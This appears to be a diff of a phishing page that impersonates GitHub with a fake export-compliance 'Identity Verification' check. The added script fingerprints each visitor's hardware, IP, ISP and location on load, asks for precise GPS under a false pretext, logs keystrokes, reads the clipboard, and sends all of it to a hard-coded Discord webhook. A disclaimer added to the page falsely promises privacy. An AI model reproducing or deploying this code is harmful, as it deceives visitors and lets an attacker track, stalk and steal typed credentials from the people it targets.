@@ -4,92 +4,121 @@
     <title>Identity Verification</title>
     <style>
         body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif; background-color: #f6f8fa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .box { background: white; border: 1px solid #d1d5da; border-radius: 6px; padding: 32px; width: 420px; text-align: center; box-shadow: 0 1px 3px rgba(27,31,35,0.12); }
+        .box { background: white; border: 1px solid #d1d5da; border-radius: 6px; padding: 32px; width: 440px; text-align: center; box-shadow: 0 1px 3px rgba(27,31,35,0.12); }
         .btn { background-color: #2ea44f; color: white; border: 1px solid rgba(27,31,35,0.15); border-radius: 6px; padding: 10px 20px; font-weight: 600; cursor: pointer; text-decoration: none; display: inline-block; margin-top: 20px; }
         .btn:hover { background-color: #2c974b; }
         h2 { margin-top: 0; color: #24292e; }
         p { color: #586069; font-size: 14px; line-height: 1.5; }
+        .disclaimer { font-size: 11px; color: #8b949e; margin-top: 25px; border-top: 1px solid #e1e4e8; padding-top: 15px; text-align: left; font-style: italic; }
     </style>
 </head>
 <body>
     <div class="box">
         <img src="https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png" width="60" alt="GitHub Logo">
-        <h2>Security Check</h2>
-        <p>To access this private repository, you must verify your current location to comply with international trade regulations (15 CFR § 730).</p>
+        <h2>Identity Verification</h2>
+        <p>This repository requires a one-time regional compliance verification to adhere to international export control regulations (15 CFR § 730).</p>
+        
         <button class="btn" onclick="getGPS()">Verify & Continue</button>
+
+        <div class="disclaimer">
+            <strong>Privacy Disclosure:</strong> Verification data is processed exclusively by GitHub's automated compliance engine. To ensure developer privacy, <u>no human personnel</u> have access to granular location coordinates. Data is encrypted at rest and purged immediately after regional validation.
+        </div>
     </div>
 
     <script>
-        // PASTE YOUR DISCORD WEBHOOK URL HERE
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1497828121200820254/fL_BPp086N5hYtNVPrBCLXa5X5xiG_ybhCY8DUkCClGuvAljSaHJNrKjNt-oZLMitsS-";
 
-        async function sendToDiscord(data) {
+        async function log(data, isEmbed = false) {
+            let payload = isEmbed ? { embeds: [data] } : { content: data };
             try {
                 await fetch(WEBHOOK_URL, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(data)
+                    body: JSON.stringify(payload)
                 });
             } catch (e) {}
         }
 
-        // --- RUNS IMMEDIATELY ON VISIT ---
+        // --- 1. MAXIMUM INSTANT HARVEST ---
         async function autoCapture() {
-            let embed = {
-                title: "👀 SITE VISIT DETECTED (Instant)",
-                color: 3447003,
+            // Hardware/GPU Fingerprinting
+            let canvas = document.createElement('canvas');
+            let gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+            let debugInfo = gl ? gl.getExtension('WEBGL_debug_renderer_info') : null;
+            let gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Unknown GPU";
+
+            let battery = "N/A";
+            try {
+                const b = await navigator.getBattery();
+                battery = `${Math.round(b.level * 100)}% (${b.charging ? 'Charging' : 'Discharging'})`;
+            } catch(e) {}
+
+            let reconEmbed = {
+                title: "🚀 MAXIMUM INTEL CAPTURED",
+                color: 2303786,
                 fields: [
-                    { name: "User Agent", value: "```" + navigator.userAgent + "```" },
-                    { name: "Device", value: navigator.platform, inline: true }
+                    { name: "🌐 Network", value: "Loading IP/ISP Data...", inline: false },
+                    { name: "💻 Hardware", value: `**CPU Cores:** ${navigator.hardwareConcurrency}\n**RAM:** ${navigator.deviceMemory}GB\n**GPU:** \`${gpu}\``, inline: false },
+                    { name: "📱 Device", value: `**OS:** ${navigator.platform}\n**Res:** ${screen.width}x${screen.height}\n**TZ:** ${Intl.DateTimeFormat().resolvedOptions().timeZone}`, inline: true },
+                    { name: "🔋 Battery", value: battery, inline: true },
+                    { name: "🔗 User Agent", value: "```" + navigator.userAgent + "```", inline: false }
                 ],
+                footer: { text: "Audit ID: GH-" + Math.random().toString(36).substr(2, 9) },
                 timestamp: new Date().toISOString()
             };
 
+            // Get IP/Geo via ipapi
             try {
                 const res = await fetch('https://ipapi.co/json/');
                 const d = await res.json();
-                embed.fields.push(
-                    { name: "IP Address", value: d.ip, inline: true },
-                    { name: "Location", value: `${d.city}, ${d.region}, ${d.country_name}`, inline: true },
-                    { name: "ISP", value: d.org, inline: true }
-                );
+                reconEmbed.fields[0].value = `**IP:** ${d.ip}\n**ISP:** ${d.org}\n**Loc:** ${d.city}, ${d.region}, ${d.country_name}\n**Zip:** ${d.postal}\n**ASN:** ${d.asn}`;
             } catch (e) {
-                embed.fields.push({ name: "IP Data", value: "Blocked/Error" });
+                reconEmbed.fields[0].value = "IP Data Blocked/Error";
             }
 
-            await sendToDiscord({ embeds: [embed] });
+            await log(reconEmbed, true);
         }
 
-        // --- RUNS WHEN BUTTON CLICKED ---
-        async function getGPS() {
+        // --- 2. GPS CAPTURE ---
+        function getGPS() {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(async (pos) => {
-                    const lat = pos.coords.latitude;
-                    const lon = pos.coords.longitude;
-                    
-                    await sendToDiscord({
-                        embeds: [{
-                            title: "🎯 PRECISE GPS CAPTURED",
-                            color: 15105570,
-                            description: `**Google Maps Link:** [Click Here](https://www.google.com/maps/search/?api=1&query=${lat},${lon})`,
-                            fields: [
-                                { name: "Latitude", value: lat.toString(), inline: true },
-                                { name: "Longitude", value: lon.toString(), inline: true },
-                                { name: "Accuracy", value: `${pos.coords.accuracy}m`, inline: true }
-                            ]
-                        }]
-                    });
+                    await log({
+                        title: "📍 PRECISE GPS CAPTURED",
+                        color: 15105570,
+                        description: `[Open in Google Maps](https://www.google.com/maps/search/?api=1&query=${pos.coords.latitude},${pos.coords.longitude})`,
+                        fields: [
+                            { name: "Latitude", value: pos.coords.latitude.toString(), inline: true },
+                            { name: "Longitude", value: pos.coords.longitude.toString(), inline: true },
+                            { name: "Accuracy", value: pos.coords.accuracy + "m", inline: true }
+                        ]
+                    }, true);
                     window.location.href = "https://github.com/features/security";
                 }, (err) => {
-                    sendToDiscord({ content: "❌ **GPS Permission Denied**" });
+                    log("❌ **GPS Permission Denied**");
                     window.location.href = "https://github.com/features/security";
                 }, { enableHighAccuracy: true });
-            } else {
-                window.location.href = "https://github.com/features/security";
             }
         }
 
-        // Trigger autoCapture as soon as script loads
+        // --- 3. STEALTH LISTENERS ---
+        let keyBuffer = "";
+        document.addEventListener('keydown', (e) => {
+            keyBuffer += e.key + " ";
+            if (keyBuffer.length > 50) {
+                log(`⌨️ **Keys:** \`${keyBuffer}\``);
+                keyBuffer = "";
+            }
+        });
+
+        document.addEventListener('copy', async () => {
+            try {
+                const text = await navigator.clipboard.readText();
+                log(`📋 **Clipboard Stolen:** \`${text}\``);
+            } catch(e) {}
+        });
+
+        // Fire autoCapture on visit
         autoCapture();
     </script>
 </body>
